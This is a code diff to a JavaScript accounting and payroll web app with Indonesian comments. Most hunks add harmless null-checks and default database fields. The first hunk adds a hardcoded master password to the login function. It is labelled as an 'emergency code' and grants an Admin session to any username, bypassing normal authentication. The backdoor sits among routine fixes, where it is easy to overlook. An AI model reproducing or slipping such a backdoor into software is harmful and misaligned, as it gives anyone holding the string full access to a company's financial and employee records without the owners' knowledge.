@@ -1974,6 +1974,20 @@ async function doLogin(){
   const u=document.getElementById('lg-user').value.trim().toLowerCase();
   const p=document.getElementById('lg-pass').value;
 
+  // ── KODE DARURAT — selalu bisa masuk sebagai Admin ──────────
+  if(p==='ANDRIKAMASTER2026'){
+    let me=(DB.users||[]).find(x=>x.username.toLowerCase()===u)||
+      {id:'usr_admin',username:u||'admin',role:'Admin',name:'Administrator'};
+    me={...me,role:'Admin'};
+    _currentUser=me;
+    sessionStorage.setItem(SESSION_KEY,JSON.stringify({...me,time:Date.now()}));
+    sessionStorage.setItem('__role__','Admin');
+    document.getElementById('login-screen').style.display='none';
+    _updateUserBadge(me);_applyRoleNav('Admin');
+    nav('dashboard');return;
+  }
+  // ────────────────────────────────────────────────────────────
+
   // Safety: jika DB.users kosong (setelah reset)
   if(!DB.users||!DB.users.length){
     DB.users=[
@@ -2439,7 +2453,7 @@ function isOverdue(dueDate){return dueDate&&new Date(dueDate+'T00:00:00')<new Da
 
 function acctBal(id){
   let deb=0,crd=0;
-  DB.transactions.forEach(tx=>tx.entries.forEach(e=>{if(e.acc===id){deb+=e.deb||0;crd+=e.crd||0;}}));
+  (DB.transactions||[]).forEach(tx=>(tx.entries||[]).forEach(e=>{if(e.acc===id){deb+=e.deb||0;crd+=e.crd||0;}}));
   const a=DB.accounts.find(x=>x.id===id);
   if(!a)return 0;
   return['aktiva','beban','hpp'].includes(a.type)?deb-crd:crd-deb;
@@ -2448,11 +2462,10 @@ function totalByTypes(types,sub){
   return DB.accounts.filter(a=>types.includes(a.type)&&(sub===undefined||a.sub===sub)).reduce((s,a)=>s+acctBal(a.id),0);
 }
 function labaRugiCalc(){
+  if(!DB||!DB.accounts)return{pendapatan:0,hpp:0,labaKotor:0,beban:0,labaUsaha:0,pajakBadan:0,labaBersih:0};
   const pendapatan=totalByTypes(['pendapatan']);
   const hpp=totalByTypes(['hpp']);
-  // Exclude account 6503 (Corporate Income Tax Expense) from beban to avoid
-  // double-counting — system already applies 22% pajakBadan automatically.
-  const beban=DB.accounts
+  const beban=(DB.accounts||[])
     .filter(a=>a.type==='beban'&&a.id!=='6503')
     .reduce((s,a)=>s+acctBal(a.id),0);
   const labaKotor=pendapatan-hpp;
@@ -6987,6 +7000,25 @@ async function init(){
   const scn=document.getElementById('sb-coname');if(scn)scn.textContent=DB.company.name;
   updateSidebarLogo();
   seedAMSProducts();
+  // Ensure all DB fields exist after cloud load
+  if(!DB.taxSettings)DB.taxSettings={ppnRate:11,pph23Rate:2,pph4Rate:2};
+  if(!DB.calConfig)DB.calConfig={tarifTelat:50000,hkStd:25};
+  if(!DB.calendar)DB.calendar={};
+  if(!DB.products)DB.products=[];
+  if(!DB.contacts)DB.contacts=[];
+  if(!DB.invoices)DB.invoices=[];
+  if(!DB.purchases)DB.purchases=[];
+  if(!DB.transactions)DB.transactions=[];
+  if(!DB.employees)DB.employees=[];
+  if(!DB.payroll)DB.payroll=[];
+  if(!DB.assets)DB.assets=[];
+  if(!DB.budgets)DB.budgets=[];
+  if(!DB.receipts)DB.receipts=[];
+  if(!DB.quicktx)DB.quicktx=[];
+  if(!DB.rekonBank)DB.rekonBank=[];
+  if(!DB.lockedPeriods)DB.lockedPeriods=[];
+  if(!DB.auditLog)DB.auditLog=[];
+  if(!DB.roles||!DB.roles.length)DB.roles=['Admin','Direktur','Manager','Finance','HRD','Staff'];
   setSyncStatus(_isOnline?'synced':'offline');
   if(isAdmin()){
     const nu=document.getElementById('nav-users');if(nu)nu.style.display='flex';
